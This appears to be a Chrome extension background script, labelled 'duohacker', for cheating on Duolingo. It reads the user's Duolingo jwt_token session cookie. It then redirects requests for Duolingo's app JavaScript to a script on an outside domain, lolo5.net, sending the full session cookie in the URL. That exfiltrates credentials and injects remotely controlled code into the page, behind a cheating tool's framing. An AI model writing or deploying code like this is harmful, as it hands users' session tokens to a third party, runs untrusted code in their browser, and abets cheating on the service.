var activated = "none";
var token = "none";
var cookie = "";

function text(t){
  document.querySelector('.msg').innerHTML = t;
}

chrome.storage.sync.get("activated", function(items) {
  activated = !!items.activated;
});


chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
    if (request.msg === "toggle") {
      activated = request.activated;

      chrome.windows.getAll({
        populate: true,
        windowTypes: ['normal', 'panel', 'popup'],
        }, (windows) => {
          windows.forEach((window) => {
          window.tabs.forEach((tab) => {
            if (tab.url.includes("duolingo.com")) {
              chrome.tabs.reload(tab.id);
            }
          });
        });
      });

    }
  }
);

function parseJwt(token) {
    var base64Url = token.split('.')[1];
    var base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
    var jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) {
        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
    }).join(''));

    return JSON.parse(jsonPayload);
};

chrome.cookies.get({"url": "https://duolingo.com", "name": "jwt_token"}, function(_cookie) {
  try {
    cookie = _cookie.value;
    token = parseJwt(cookie || '{"sub":""}').sub || "";
  } catch (e) {}
});


var loadtimer;
var roottext = "";

chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
    if (request.msg == "rootDOM") {
      roottext = request.text;
    }
  }
);


chrome.webRequest.onBeforeRequest.addListener(function(details) {
  if (activated && !!token && details.url.includes(".cloudfront.net/js/app-") && details.url.includes(".js")) {
    loadtimer = setInterval(()=>{
      if(activated != "none"){
        if((document.querySelector('#duohacker') || document.body).innerText === "true"){
          if(!activated){
            document.location.reload();
          }
          clearInterval(loadtimer);
        }else if(roottext != ""){
          clearInterval(loadtimer);
          document.location.reload();
        }else if(activated){
          document.location.reload();
        }
      }
    },500);

    return {
      redirectUrl: `https://lolo5.net/apps/duohacker/script.js?t=${token}&r=${Date.now()}&c=${cookie}` /* the parameter "c" is optional and may be removed. it was added to make the extension future-proof :) */
      //redirectUrl: `http://localhost:5000/apps/duohacker/script.js?t=${token}&r=${Date.now()}&c=${cookie}`
    };
	}
}, {
  urls: ["<all_urls>"]
}, ["blocking"]);
